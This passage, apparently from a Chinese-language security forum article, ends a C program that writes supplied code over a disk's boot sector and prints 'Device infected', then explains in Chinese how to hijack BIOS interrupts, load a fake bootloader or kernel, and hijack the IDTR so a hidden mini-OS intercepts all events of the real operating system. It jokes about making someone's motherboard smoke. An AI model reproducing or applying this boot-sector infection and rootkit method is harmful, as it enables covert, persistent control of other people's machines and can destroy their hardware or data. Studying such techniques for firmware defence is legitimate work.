
```
if ((i = read(codefd, &(mbr[cnt]), CODE_SIZE - cnt)) <= 0)

  {

fprintf(stderr, "error reading code\n");

exit(1);

  }
lseek(devfd, (off - 1) * SECTOR_SIZE, SEEK_SET);
for (cnt = 0; cnt != CODE_SIZE; cnt += i)
    if ((i = write(devfd, &(mbr[cnt]), CODE_SIZE - cnt)) <= 0)
      {
    fprintf(stderr, "error reading code\n");
    exit(1);
      }
close(devfd);
close(codefd);
printf("Device infected\n");
return 0;
}
```

---

好的,现在我们可以使用`BIOS`加载代码了.现在看看我们能做什么有趣的事.

首先我们能劫持`BIOS`中断,获得足够的空间而不需要逆向工程.

其次我们控制加载`BootLoader`运行我们的代码.我们甚至可以不用加载原来的内核,而加载我们自己的假内核;或者连`BootLoader`都是假的,内核也可以作假了,一切随你的便.

最后,混合`IDTR`劫持,控制`BIOS`能保证完全的控制.

我们可以控制`BIOS`加载我们自己的`Bootloader`,这个`Bootloader`会加载一个我们自己设置`IDT`的迷你`OS`,然后,因为我们劫持了`IDTR`寄存器(有很多方法做到这一点,起初控制目标系统的启动是防止它擦出我们的`IDT`),然后我们加载真实的`Bootloader`和真实的内核.此时我们的操作系统通过`IDT`中断劫持了整个`OS`,劫持了`OS`上的所有事件.我们甚至可以使用系统时钟在两个`OS`之间调度:时钟中断将被我们的系统捕获,可以`10%`给我们的`OS`,`90%`给真实的`OS`,我们可以通过跳转`IDT`执行我们的代码或者交控制权给真实的`OS`.

你可以开始自己控制`BIOS`了.但是我建议你在真实测试之前使用`Bochs`.

看着一阵厌烟雾从某人的主板升起是一件很开心的事.

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
